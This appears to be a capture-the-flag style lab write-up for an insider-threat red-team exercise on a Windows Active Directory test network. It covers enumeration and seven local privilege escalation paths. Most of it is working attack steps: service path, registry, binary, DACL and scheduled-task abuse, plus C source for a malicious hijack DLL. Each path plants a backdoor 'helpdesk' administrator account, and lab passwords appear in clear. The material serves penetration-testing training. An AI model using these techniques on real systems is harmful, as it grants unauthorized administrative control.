# Inside Job

Megacorp, a very large company, has recently acquired several SMEs (Small and Medium-sized Enterprises). Being highly risk-averse and serious about their security posture, Megacorp is conducting multiple simultaneous security assessments.

- [Inside Job](#inside-job)
  - [Task Overview](#task-overview)
  - [Rules of Engagement](#rules-of-engagement)
  - [Lab Environment Setup](#lab-environment-setup)
  - [Lab Session Guidelines](#lab-session-guidelines)
  - [Reconnaissance](#reconnaissance)
    - [Initial Enumeration of the Environment](#initial-enumeration-of-the-environment)
    - [User Enumeration](#user-enumeration)
    - [Group Enumeration](#group-enumeration)
    - [Privilege Information](#privilege-information)
    - [Identifying Non-Default Applications](#identifying-non-default-applications)
    - [Network Reconnaissance "Using Angry IP Scanner"](#network-reconnaissance-using-angry-ip-scanner)
    - [Identifying Potential Third-Party Services](#identifying-potential-third-party-services)
    - [Scheduled Tasks in "Tasks Migrated" Folder](#scheduled-tasks-in-tasks-migrated-folder)
  - [Privilege Escalation](#privilege-escalation)
    - [RemoteMouseService (CVE-2021-35448)](#remotemouseservice-cve-2021-35448)
    - [Unquoted Service Path](#unquoted-service-path)
    - [Insecure Registry Service](#insecure-registry-service)
    - [File Permission Service](#file-permission-service)
    - [DLL Hijack Service](#dll-hijack-service)
    - [DACL Service](#dacl-service)
    - [Scheduled Tasks (pinger)](#scheduled-tasks-pinger)
  - [Verify Local Admin Access](#verify-local-admin-access)


## Task Overview

Your assignment is to assess the **insider threat** scenario through a red-team exercise. Your objectives are:

- **Discover and exploit** all identifiable security issues.
- **Escalate privileges** from a low-privileged domain user to demonstrating control over the Active Directory environment.
- **Uncover** as many exploitation paths as possible.

> **Note:** There are no extra points for finishing quickly; the client expects a thorough examination of the environment.

## Rules of Engagement

You may use any tools or techniques available, provided you adhere to the following rules:

1. **Domain Controller Restrictions:**
   - Do **not** shutdown, reboot, crash, or otherwise disrupt the domain controller.
2. **Admin Workstation Restrictions:**
   - Do **not** log on locally to Tom's admin workstation; however, you may connect over the network.
   - Do **not** shutdown, reboot, or crash the admin workstation.
   - Do **not** terminate the admin's active session.

> We do not expect perfect stealth, but actions violating these rules generate excessive noise.

## Lab Environment Setup

Follow these steps to start the VirtualBox lab environment:

1. **Start the Domain Controller VM (`win2019srv`):**
   - Launch from the saved snapshot. If the current state differs from the snapshot, revert to the snapshot first.
   - The domain controller VM will start in a minimized window.
2. **Start the Admin VM (`win10adm`):**
   - Launch from the saved snapshot. Again, if the current state differs from the snapshot, revert to the snapshot first.
   - The VM should start up and display a user logged in with the screen locked.
3. **Start Your Workstation (`win10client`):**

   - Log in using the following credentials:

     ```plaintext
     Username: normaluser
     Display Name: Norman Luserov
     Password: L3tm3!n
     ```

## Lab Session Guidelines

Each lab session will involve extensive research and experimentation. You are encouraged to test any tools or methods you discover. However, exercise caution when using pre-built tools from online sources, as some may cause system instability. If you damage your VM, revert to the snapshot and start over.

Further instructions will be provided at the beginning of each session. A team sync-up will occur at the end of each session to share ideas, successes, and failures.

> **Tip:** If you become completely stuck, do not hesitate to ask for a hint.

![Login screen of Norman Luserov](.assets/norman_luserov.png)

---

## Reconnaissance

### Initial Enumeration of the Environment

```bash
C:\Users\normaluser>whoami
adlab\normaluser
```

We have established the current user context as adlab\normaluser. This is a domain user account that will serve as our starting point for further enumeration and privilege escalation.

```bash
C:\Users\normaluser>hostname
win10client
```

The system's hostname is confirmed to be `win10client`, which matches the earlier information from `systeminfo`.

```bash
C:\Users\normaluser>systeminfo
```

The system information reveals critical details about the host:

- **Hostname:** WIN10CLIENT
- **OS:** Windows 10 Pro (Version 19045)
- **Domain:** ADLAB.local
- **Network Adapters:**
  - IP Address: `192.168.56.40`

From this output, we gather that the system is part of the `ADLAB.local` domain, and the primary active network interface is operating in the `192.168.56.0/24` range. This will be the primary focus for network exploration and potential lateral movement.

```bash
echo %logonserver%
```

The domain controller is `\\WIN2019DC`, a critical target for future exploitation steps.

### User Enumeration

We use the `net user` command to enumerate domain users.

```bash
C:\Users\normaluser>net user /domain
```

A long list of users is returned. Some notable accounts to consider during further exploration include:

- **Administrator**
- **Normaluser** (our current user)
- **sqlserver**
- **chantalle.karol** (listed as a Domain Admin)
- **domad** (another Domain Admin)

This enumeration will be helpful in identifying potential lateral movement or privilege escalation targets.

### Group Enumeration

Next, we enumerate domain groups to understand group memberships and potential privileges.

```bash
C:\Users\normaluser>net group /domain
```

We observe some key groups, such as:

- **Domain Admins**
- **Enterprise Admins**
- **IT Admins**
- **Executives**
- **Office Admin**

We also confirm that `chantalle.karol` and `domad` are part of the `Domain Admins` group, making them prime targets for credential theft or impersonation.

### Privilege Information

```bash
C:\Users\normaluser>net group "domain admins" /domain
```

The Domain Admins group members are:

- **Administrator**
- **chantalle.karol**
- **domad**
- **sqlserver**

This confirms our earlier findings and highlights potential high-value targets for privilege escalation.

---

### Identifying Non-Default Applications

To identify third-party or non-default applications that could potentially be exploited, we inspected the installed applications via the **Settings > Apps > Apps & features** menu.

![Angry IP Scanner](.assets/angry_ip_scanner.png)

During this process, we discovered the presence of **Angry IP Scanner**, a network scanning tool, which could be useful for gaining further insight into the network's structure and identifying potential targets for lateral movement.

Screenshot of the installed application list revealed:

- **Angry IP Scanner** (Version 3.9.1), which could be leveraged for reconnaissance.

### Network Reconnaissance "Using Angry IP Scanner"

Since `Angry IP Scanner` is already installed on the workstation, we leverage it to scan the local network.

![Network reconnaissance using "Angry IP Scanner" results](.assets/angry_ip_scanner_results.png)

The scan results for the `192.168.56.0/24` subnet reveal several hosts, including:

- **WIN2019DC (192.168.56.10):** The domain controller
- **win10adm (192.168.56.30):** The admin workstation
- **win10client.ADLAB.local (192.168.56.40):** Our current workstation

These hosts represent the core environment we need to explore. The domain controller and the admin workstation are key systems to focus on for privilege escalation.

---

### Identifying Potential Third-Party Services

We explored services to identify potential vulnerable or third-party services.

1. **Open the Services Manager**:

   - Press **⊞ Win + R** to open the **Run** dialog.
   - Type `Services.msc` and hit **Enter**.

2. **Sort Services by Description**:
   - Once in the Services Manager, sort the services by their description to locate services that lack a description or that seem non-standard. These are likely third-party services or custom configurations.

![Third Party services](.assets/services.png)

By following these steps, we identified several non-default services that lack descriptions, which could be potentially exploitable:

- **Unquoted Path Service**
- **RemoteMouseService**
- **Insecure Registry Service**
- **File Permission Service**
- **DLL Hijack Service**
- **DACL Service**

> **Note:** Third-party services may or may not have a description. Just because a service has a description doesn’t mean it’s safe, and conversely, the absence of a description could indicate a non-standard service that might be exploitable.
> **Tip:** Pay attention to services running under a named user account.

These services run with **Local System** privileges, presenting potential privilege escalation paths if vulnerabilities like unquoted service paths or weak permissions are present.

### Scheduled Tasks in "Tasks Migrated" Folder

Check for misconfigured scheduled tasks that can escalate privileges.

1. **Go to the Folder**:
   - Open the **Tasks Migrated** folder by running:

     ```bash
     cd C:\Windows\Tasks Migrated
     ```

2. **List the Files**:
   - See what's inside by typing:

     ```bash
     dir
     ```

   - You’ll see files representing scheduled tasks, for example:
  
     ```bash
     pinger
     MicrosoftEdgeUpdateTaskMachineCore
     OneDrive Reporting Task...
     ```

3. **View Task Details**:
   - Use the `type` command to look inside a task. For example:

     ```bash
     type pinger
     ```

   This shows information about who runs the task and what it does. Key things to look for:
   - **Author**: The user who created the task (e.g., `Administrator`).
   - **Triggers**: When the task runs (e.g., at logon).
   - **Actions**: The command it runs (e.g., `pinger.bat` script).

> **Note:** Knowing who created the task is important because it tells you what level of privileges the task has when it runs.

---

## Privilege Escalation

Several services running as **Local System** are vulnerable:

- **RemoteMouseService (CVE-2021-35448)**
- **Unquoted Path Service**
- **Insecure Registry Service**
- **File Permission Service**
- **DLL Hijack Service**
- **DACL Service**

One misconfigured task, created by **Administrator**, which can be modified:

- **Scheduled Tasks (pinger)**

Our goal is to exploit these to gain local administrative privileges.

---

### RemoteMouseService (CVE-2021-35448)

The Remote Mouse application lets us open an administrator command prompt.

**Steps:**

1. **Open Settings:**

   - Click the Remote Mouse icon in the system tray.
   - Select **Settings**.

2. **Change Image Transfer Folder:**

   - Click **Change...** next to **Image Transfer Folder**.
   - A **Save As** dialog appears.

3. **Launch Command Prompt:**

   - In the address bar, type:

     ```bash
     C:\Windows\System32\cmd.exe
     ```

   - Press **Enter**.
   - An administrator command prompt opens.

4. **Verify Privileges:**

    ```bash
    C:\Users\normaluser> whoami
    nt authority\system
    ```

5. **Create Admin User:**

    To create a new administrator account, use the following command:

    ```bash
    net user <username> <password> /add && net localgroup administrators <username> /add
    ```

    **Example:**

    ```bash
    net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add
    ```

    - **username**: The desired name for the new account (e.g., `helpdesk`).
    - **password**: The password for the new account (e.g., `L3tm3!n`).

    **Result:**

    This command creates a new user with the specified credentials and adds it to the **Administrators** group, granting elevated privileges.

---

### Unquoted Service Path

![Unquoted Path Service Properties](.assets/unquoted_path_service.png)

This service has an unquoted executable path with spaces, making it vulnerable to privilege escalation. The path is:

`C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`

**Steps:**

1. **Check Folder Permissions:**

   - Run this command to check who can access and modify files in the folder:

     ```bash
     icacls "C:\Program Files\Unquoted Path Service\Common Files"
     ```

   - Look for the following permission flags in the output:

     - **(F)** – Full control: Can read, write, delete, and change permissions.
     - **(M)** – Modify: Can read, write, and delete files.
     - **(RX)** – Read & Execute: Can read and run files.
     - **(R)** – Read: Can only view the files.
     - **(W)** – Write: Can add files but with limited rights.

   - Focus on whether **BUILTIN\Users**, **Everyone** or other non-admin groups have **(F)** or **(M)** permissions, meaning you can write or modify files. If only **(RX)** or **(R)** is shown, you don’t have the required access.

2. **Create a Batch File:**

   - Write a simple batch file called `Common.bat` with the following content:

     ```bash
     net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add
     ```

   - This will create a user `helpdesk` with administrative rights.

3. **Convert Batch File to Executable:**

   - Use a tool like [bat2exe](https://bat2exe.net/) to convert the batch file into an executable file (`Common.exe`).

4. **Place Executable:**

   - Save the newly created `Common.exe` into:

     ```plaintext
     C:\Program Files\Unquoted Path Service\Common Files\
     ```

5. **Restart the Service:**

   - Restart the vulnerable service to trigger the execution of your malicious file:

     ```bash
     sc stop unquotedsvc
     sc start unquotedsvc
     ```

---

### Insecure Registry Service

![Insecure Registry Service Properties](.assets/insecure_registry_service.png)

We can change the service's executable path in the registry.

**Steps:**

1. **Open Registry Editor:**

   - Press **⊞ Win + R**, type `regedit`, and press **Enter**.

2. **Navigate to Service Key:**

     `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc`

3. **Edit `ImagePath`:**

   - Right-click `ImagePath` and select **Modify**.
   - Change the value to:

     ```bash
     cmd.exe /c net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add
     ```

4. **Restart Service:**

   ```bash
   sc stop regsvc
   sc start regsvc
   ```

---

### File Permission Service

![File Permission Service Properties](.assets/file_permissions_service.png)

We have write access to the service executable.

`"C:\Program Files\File Permissions Service\filepermservice.exe"`

**Steps:**

1. **Find Service Path:**

   ```bash
   sc qc filepermsvc
   ```

    **BINARY_PATH_NAME:** `"C:\Program Files\File Permissions Service\filepermservice.exe"`

2. **Check Folder Permissions:**

   - Run this command to check who can access and modify the file:

     ```bash
     icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
     ```

   - Look for the following permission flags in the output:

     - **(F)** – Full control: Can read, write, delete, and change permissions.
     - **(M)** – Modify: Can read, write, and delete files.
     - **(RX)** – Read & Execute: Can read and run files.
     - **(R)** – Read: Can only view the files.
     - **(W)** – Write: Can add files but with limited rights.

   - Focus on whether **BUILTIN\Users**, **Everyone** or other non-admin groups have **(F)** or **(M)** permissions, meaning you can write or modify files. If only **(RX)** or **(R)** is shown, you don’t have the required access.

3. **Create a Batch File:**

   - Write a simple batch file called `filepermservice.bat` with the following content:

     ```bash
     net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add
     ```

   - This will create a user `helpdesk` with administrative rights.

4. **Convert Batch File to Executable:**

   - Use a tool like [bat2exe](https://bat2exe.net/) to convert the batch file into an executable file (`filepermservice.exe`).

5. **Replace Executable:**

   ```bash
   copy /Y Z:\filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
   ```

6. **Restart Service:**

   ```bash
   sc stop filepermsvc
   sc start filepermsvc
   ```

---

### DLL Hijack Service

![DLL Hijack Service Properties](.assets/dll_hijack_service.png)

A vulnerable service attempts to load a missing DLL, which allows us to escalate privileges by injecting a malicious DLL.

**Steps:**

1. **Identify Missing DLLs:**

   - Use a tool like [ProcMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to detect which DLLs the service tries to load but cannot find.

   - **Optional Setup:** If you lack administrative privileges to run ProcMon, you can extract `dllhijackservice.exe` and create a service on a machine where you have admin access to investigate its behavior:

     ```bash
     sc create dllsvc binpath="C:\fullpath\to\dllhijackservice.exe"
     ```

   - In ProcMon, configure a filter to focus on the target process:

     - **Column:** Process Name
     - **Relation:** is
     - **Value:** dllhijackservice.exe
     - **Action:** include

   - Upon running the service, ProcMon will show an attempt to load a missing DLL, such as `hijackme.dll`. The service will first search for the DLL in its own directory, for example:

     ```plaintext
     C:\Program Files\DLL Hijack Service\hijackme.dll
     ```

     If the DLL is not found, it will search through directories listed in the system’s **PATH** environment variable.

2. **Create Malicious DLL:**

   - Write a malicious DLL that creates a new user with administrative privileges. Create a file called `hijackme.c` with the following content:

     ```c
     #include <windows.h>

     BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
         if (dwReason == DLL_PROCESS_ATTACH) {
             system("cmd.exe /c net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add");
             ExitProcess(0);
         }
         return TRUE;
     }
     ```

   - Compile the DLL using a cross-compiler:

     - For 64-bit systems:

       ```bash
       x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
       ```

     - For 32-bit systems:

       ```bash
       i686-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
       ```

3. **Deploy the Malicious DLL:**

   - Copy the compiled `hijackme.dll` to the vulnerable service's directory:

     ```bash
     copy Z:\hijackme.dll "C:\Program Files\DLL Hijack Service\"
     ```

4. **Restart the Service:**

   - Restart the service to trigger the malicious DLL:

     ```bash
     sc stop dllsvc
     sc start dllsvc
     ```

---

### DACL Service

![DACL Service Properties](.assets/dacl_service.png)

The `daclsvc` service has improper permissions that allow unauthorized users to modify its configuration due to the **DC** permission (`Change Configuration`) being granted to the **Everyone** group.

**Steps:**

1. **Check Permissions:**

   - Run the following command to view the service's security descriptor:

     ```bash
     sc sdshow daclsvc
     ```

   - Look for this specific part of the output:

     ```bash
     (A;;CCDCLCSWRPWPLORC;;;WD)
     ```

   - Focus on **`CCDCLCSWRPWPLORC`**, where:
     - **DC** stands for **Change Configuration**.
     - **WD** represents the **Everyone** group (World).

   The presence of `DC` in this string indicates that **Everyone** has permission to change the service configuration, which is a serious security risk.

2. **Modify Service Path:**

   - Use the following command to change the binary path of the service to execute a command that creates a new user and adds them to the administrators group:
  
     ```bash
     sc config daclsvc binPath= "cmd.exe /c net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add"
     ```

3. **Restart Service:**

   - Stop and start the service to execute the command:

     ```bash
     sc stop daclsvc
     sc start daclsvc
     ```

---

### Scheduled Tasks (pinger)

We have identified a scheduled task running under an administrative account, and we have permission (Indirect) to modify the script it runs.

**Steps:**

1. **Check File and Folder Permissions**:
   - Ensure you can edit the script or file that the task runs by checking the permissions with the following command:

     ```bash
     icacls C:\temp\pinger.bat
     ```

     Output example:

     ```bash
     pinger.bat NT AUTHORITY\SYSTEM:(F)
                BUILTIN\Administrators:(F)
                BUILTIN\Users:(RX)
     ```

     - In this case, **BUILTIN\Users** only has **(RX)** (Read & Execute) access to the file, meaning regular users can only read and run it but cannot modify it.

   - Next, check the permissions on the folder:

     ```bash
     icacls C:\temp
     ```

     Output example:

     ```bash
     . BUILTIN\Users:(OI)(CI)(F)
       NT AUTHORITY\Authenticated Users:(I)(M)
     ```

     - Here, **BUILTIN\Users** have **(F)** (Full Control) on the folder, meaning you can add, delete, or modify files in this directory, even though the specific file `pinger.bat` cannot be modified directly.

2. **Bypass File Restrictions**:
   - Since you cannot directly modify `pinger.bat`, you can delete the `C:\temp` folder entirely and recreate it with your own script. First, delete the `C:\temp` folder:

     ```bash
     del C:\temp
     ```

     Confirm the deletion when prompted.

   - Recreate the folder and add your own version of the `pinger.bat` file:

     ```bash
     mkdir C:\temp
     echo net user helpdesk L3tm3!n /add > C:\temp\pinger.bat
     echo net localgroup administrators helpdesk /add >> C:\temp\pinger.bat
     ```

3. **Run the Scheduled Task**:
   - If the task is set to run at logon, simply log off and back on to trigger it. Alternatively, run the task manually with:

     ```bash
     schtasks /run /tn "pinger"
     ```

---

## Verify Local Admin Access

Check if the `helpdesk` user has been added with administrative privileges:

```bash
net user 
net user helpdesk
net localgroup administrator
```

After completing the steps, you should see this result, which shows that the privilege escalation worked:

```bash
C:\Program Files\Unquoted Path Service>net user
User accounts for \\WIN10CLIENT

Administrator            DefaultAccount           Guest
helpdesk                 WDAGUtilityAccount
The command completed successfully.
```

The `helpdesk` user has been created. You can check its details:

```bash
C:\Program Files\Unquoted Path Service>net user helpdesk
User name                    helpdesk
Account active               Yes
Account expires              Never
Local Group Memberships      *Administrators       *Users
The command completed successfully.
```

You can also verify that `helpdesk` is part of the Administrators group:

```bash
C:\Users\normaluser>net localgroup administrators
Alias name     administrators
Members

ADLAB\IT Admins
Administrator
helpdesk
The command completed successfully.
```

This confirms that the attack has added the `helpdesk` account to the Administrators group, giving it full control of the system.

